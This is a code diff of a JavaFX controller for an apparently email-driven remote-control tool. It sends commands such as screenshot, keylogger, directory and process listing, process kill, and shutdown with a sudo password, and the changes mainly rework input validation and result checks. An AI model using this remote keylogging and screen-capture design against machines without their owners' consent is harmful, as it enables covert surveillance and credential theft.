@@ -14,9 +14,10 @@ import javafx.scene.layout.VBox;
 import javafx.scene.text.Font;
 import javafx.scene.text.Text;
 
-import javax.mail.MessagingException;
-import java.io.IOException;
+import java.io.File;
 import java.util.List;
+import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.regex.Pattern;
 
 public class Start {
     @FXML
@@ -125,7 +126,7 @@ public class Start {
     }
 
     @FXML
-    public void handleSendClick(ActionEvent event) {
+    public void handleSendClick(ActionEvent event) throws InterruptedException {
         String request = requestbox.getSelectionModel().getSelectedItem();
         btnSend.setDisable(true);
         requestbox.setDisable(true);
@@ -136,11 +137,12 @@ public class Start {
                     display("Mail had been sent!! Waiting for a response...", "green");
                     Thread.sleep(15000);
                     String a = CheckMail.getInstance().listen("takeshot");
-                    if (a!=null) {
+                    File file = new File(a);
+                    if (file.exists()) {
                         display("Successful! File saved in "+ a,"green");
                     }
                     else {
-                        display("Error happened","red");
+                        display(a,"red");
                     }
                 } catch (Exception e) {
                     e.printStackTrace();
@@ -155,37 +157,52 @@ public class Start {
             });
             thread.start();
         } else if (request.equals("KeyLogger")) {
-            try {
-                int time = Integer.parseInt(optionals.getText());
-                System.out.println(time);
-                System.out.println(time);
-                if (time < 0) {
-                    throw new NumberFormatException();
-                } else if (time < 1000) {
-                    display("Too small", "yellow");
-                } else {
-                    Thread thread = new Thread(()->{
-                        try {
-                            SendMail.getInstance().Send("keylog/" + time);
-                            display("Mail had been sent!! Waiting for a response...", "green");
-                            Thread.sleep(15000+time);
-                            String a = CheckMail.getInstance().listen("keylog");
-                            display("Successful! File saved in "+a,"green");
-                        } catch (Exception e) {
-                            e.printStackTrace();
-                            display(e.getMessage(), "red");
-                        } finally {
-                            Platform.runLater(() -> {
-                                btnSend.setDisable(false);
-                                requestbox.setDisable(false);
-                            });
-                        }
-                    });
-                    thread.start();
+
+            optionals.setOnAction(e -> {
+                try {
+                    btnSend.setDisable(false);
+                    int time = Integer.parseInt(optionals.getText());
+                    System.out.println(time);
+                    if (time < 0) {
+                        display("Please enter a positive time", "Red");
+                        optionals.clear();
+                    } else if (time < 1000) {
+                        display("Too small", "yellow");
+                        optionals.clear();
+                    } else {
+                        btnSend.setDisable(true);
+                        Thread thread = new Thread(() -> {
+                            try {
+                                SendMail.getInstance().Send("keylog/" + time);
+                                display("Mail had been sent!! Waiting for a response...", "green");
+                                Thread.sleep(15000 + time);
+                                String a = CheckMail.getInstance().listen("keylog");
+                                File file = new File(a);
+                                if (file.exists()) {
+                                    display("Successful! File saved in " + a, "green");
+                                }
+                                else {
+                                    display("Error when logging","red");
+                                }
+
+                            } catch (Exception ex) {
+                                ex.printStackTrace();
+                                display(ex.getMessage(), "red");
+                            } finally {
+                                Platform.runLater(() -> {
+                                    btnSend.setDisable(false);
+                                    requestbox.setDisable(false);
+                                });
+                            }
+                        });
+                        thread.start();
+
+                    }
+                } catch (NumberFormatException ex) {
+                    display("Please enter an acceptable time", "Red");
+                    optionals.clear();
                 }
-            } catch (NumberFormatException e) {
-                display("Please enter an acceptable time", "Red");
-            }
+            });
         } else if (request.equals("List Directory")) {
             Thread thread = new Thread(()-> {
                 try {
@@ -193,8 +210,9 @@ public class Start {
                     display("Mail had been sent!! Waiting for a response...", "green");
                     Thread.sleep(15000);
                     String a = CheckMail.getInstance().listen("listdir");
-                    if (a!=null) {
-                        display("Successful! File saved in "+a,"green");
+                    File file = new File(a);
+                    if (file.exists()) {
+                        display("Successful! File saved in " + a, "green");
                     }
                     else {
                         display("Error happened","red");
@@ -218,8 +236,9 @@ public class Start {
                     display("Mail had been sent!! Waiting for a response...", "green");
                     Thread.sleep(15000);
                     String a = CheckMail.getInstance().listen("listprocess");
-                    if (a!=null) {
-                        display("Successful! File saved in "+a,"green");
+                    File file = new File(a);
+                    if (file.exists()) {
+                        display("Successful! File saved in " + a, "green");
                     }
                     else {
                         display("Error happened","red");
@@ -237,32 +256,40 @@ public class Start {
             });
             thread.start();
         } else if (request.equals("Stop Process") ) {
-            Thread thread = new Thread(()->{
-                try {
-                    String pid = optionals.getText();
-                    System.out.println(pid);
-                    SendMail.getInstance().Send("stopprocess/" + pid);
-                    display("Mail had been sent!! Waiting for a response...", "green");
-                    Thread.sleep(15000);
-                    String a = CheckMail.getInstance().listen("stopprocess");
-                    if (a!=null) {
-                        display(a,"green");
-                    }
-                    else {
-                        display("Error happened","red");
-                    }
-                } catch (Exception e) {
-                    e.printStackTrace();
-                    display(e.getMessage(), "red");
-                }
-                finally {
-                    Platform.runLater(()->{
-                        btnSend.setDisable(false);
-                        requestbox.setDisable(false);
+
+            optionals.setOnAction(e ->{
+                btnSend.setDisable(false);
+                String pid = optionals.getText();
+                Pattern pattern = Pattern.compile("^\\d+$");
+                if(!pattern.matcher(pid).matches()){
+                    display("Pleas enter number!!!","Red");
+                }else{
+                    Thread thread = new Thread(() -> {
+                        try {
+                            System.out.println(pid);
+                            SendMail.getInstance().Send("stopprocess/" + pid);
+                            display("Mail had been sent!! Waiting for a response...", "green");
+                            Thread.sleep(15000);
+                            String a = CheckMail.getInstance().listen("stopprocess");
+                            if (a != null) {
+                                display(a, "green");
+                            } else {
+                                display("Error happened", "red");
+                            }
+
+                        } catch (Exception ex) {
+                            ex.printStackTrace();
+                            display(ex.getMessage(), "red");
+                        } finally {
+                            Platform.runLater(() -> {
+                                btnSend.setDisable(false);
+                                requestbox.setDisable(false);
+                            });
+                        }
                     });
+                    thread.start();
                 }
             });
-            thread.start();
         } else if (request.equals("Start Process") ) {
             Thread thread = new Thread(() -> {
                 try {
@@ -317,7 +344,7 @@ public class Start {
                 try {
                     String sudo = optionals.getText();
                     SendMail.getInstance().Send("shutdown/" + sudo);
-                    display("Mail had been sent!! Pleas wait 10 seconds, if there is response, it means some errors have occurred", "green");
+                    display("Mail had been sent!! Pleas wait 30 seconds, if there is response, it means some errors have occurred", "green");
                     Thread.sleep(10000);
                     String a = CheckMail.getInstance().listen("shutdown");
                     if (a==null) {
@@ -339,7 +366,7 @@ public class Start {
             Thread thread = new Thread(()->{
                 try {
                     SendMail.getInstance().Send("restart");
-                    display("Mail had been sent!! Pleas wait 10 seconds, if there is response, it means some errors have occurred", "green");
+                    display("Mail had been sent!! Pleas wait 30 seconds, if there is response, it means some errors have occurred", "green");
                     Thread.sleep(10000);
                     String a = CheckMail.getInstance().listen("restart");
                     if (a==null) {
@@ -370,7 +397,7 @@ public class Start {
                         display(a,"green");
                     }
                     else {
-                        display("Error happened","red");
+                        display(a,"red");
                     }
                 } catch (Exception e) {
                     e.printStackTrace();
@@ -414,7 +441,7 @@ public class Start {
                         display("Successful! File saved in "+a,"green");
                     }
                     else {
-                        display("Error happened","red");
+                        display(a,"Red");
                     }
                 } catch (Exception e) {
                     e.printStackTrace();
